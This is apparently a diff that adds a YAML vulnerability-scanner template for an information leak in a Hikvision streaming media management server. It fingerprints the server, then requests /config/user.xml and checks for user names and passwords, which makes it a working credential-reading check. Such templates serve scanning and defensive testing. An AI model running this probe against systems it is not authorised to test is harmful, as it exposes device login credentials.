@@ -1,0 +1,27 @@
+detail:
+  author: tangshoupu
+  info: Hikvision ikvision-info-leak
+  links:
+  - https://www.seebug.org/vuldb/ssvid-91762
+expression: r0() && r1()
+manual: true
+name: poc-yaml-hikvision-info-leak
+rules:
+  r0:
+    expression: "response.status == 200 && response.body.bcontains(b\"<TITLE>\u6D41\
+      \u5A92\u4F53\u7BA1\u7406\u670D\u52A1\u5668</TITLE>\") && response.body.bcontains(b\"\
+      \u6D77\u5EB7\u5A01\u89C6\")"
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /
+  r1:
+    expression: response.status == 200 && response.body.bcontains(b"<user name=\"")
+      && response.body.bcontains(b" password=\"")
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /config/user.xml
+transport: http
